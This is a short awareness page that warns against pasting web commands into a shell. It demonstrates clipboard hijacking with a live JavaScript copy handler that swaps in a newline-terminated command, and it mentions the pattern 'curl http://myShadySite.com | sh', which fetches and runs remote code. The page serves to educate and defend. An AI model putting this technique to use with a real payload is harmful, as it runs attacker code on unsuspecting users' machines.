

# Don't Copy Paste Into A Shell

When you see a shell command on the Internet, do not copy it into your terminal.

Modern JavaScript Clipboard APIs allow a website to trivially overwrite what you put inside your clipboard, without the user's confirmation or permission.


Here is an example of how easy it is to perform this attack. Imagine that the red text below is a shell command you want to use.


<p id="copyme" style="background-color:red;">$ echo "looks safe to me!"</p>


Note that you don't even have to press ENTER in your terminal after pasting for the exploit to happen. The payload conveniently contains a trailing newline that does that for you!

Here is the JavaScript that is performing the exploit.

```
document.getElementById('copyme').addEventListener('copy', function(e) {
    e.clipboardData.setData('text/plain', 
        'echo "this could have been [curl http://myShadySite.com | sh]"\n'
    );
    e.preventDefault();
});
```

<script>
document.getElementById('copyme').addEventListener('copy', function(e) {
    e.clipboardData.setData('text/plain', 'echo "this could have been [curl http://myShadySite.com | sh]"\n');
    e.preventDefault();
});
</script>